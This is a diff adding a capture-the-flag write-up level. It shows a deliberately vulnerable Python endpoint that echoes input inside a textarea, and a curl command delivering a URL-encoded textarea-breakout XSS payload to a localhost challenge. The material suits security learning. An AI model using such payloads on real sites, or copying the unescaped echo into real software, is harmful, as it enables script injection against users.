@@ -47,3 +47,39 @@ While I used the browser because it was easier to test the alert, it also works 
 ```sh
 curl "http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E"
 ```
+
+## Level 9 - Exploit a cross site scripting vulnerability with more complicated context
+
+Code for this level,
+
+```python
+def level9():
+    if request.path == "/echo":
+        echo = request.args.get("echo")
+        assert echo, "Missing `echo` argument"
+        return html(f"<textarea>{echo}</textarea>")
+
+    if request.path == "/visit":
+        url = request.args.get("url")
+        assert url, "Missing `url` argument"
+
+        url_arg_parsed = urllib.parse.urlparse(url)
+        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"
+
+        with run_browser() as browser:
+            browser.get(url)
+            try:
+                WebDriverWait(browser, 1).until(EC.alert_is_present())
+            except TimeoutException:
+                return "Failed to alert\n"
+            else:
+                return f"{flag}\n"
+
+    return "Not Found\n", 404
+```
+
+The difference here is that the value that is echo'd is contained within a `<textarea>`, so the script won't be run. Unless of course we complete the `</textarea>`. I will send `</textarea><script>alert('XSS')</script><textarea>` to the echo, which encoded is, `%3C%2Ftextarea%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3Ctextarea%3E`.
+
+```sh
+curl "http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3Ctextarea%3E"
+```
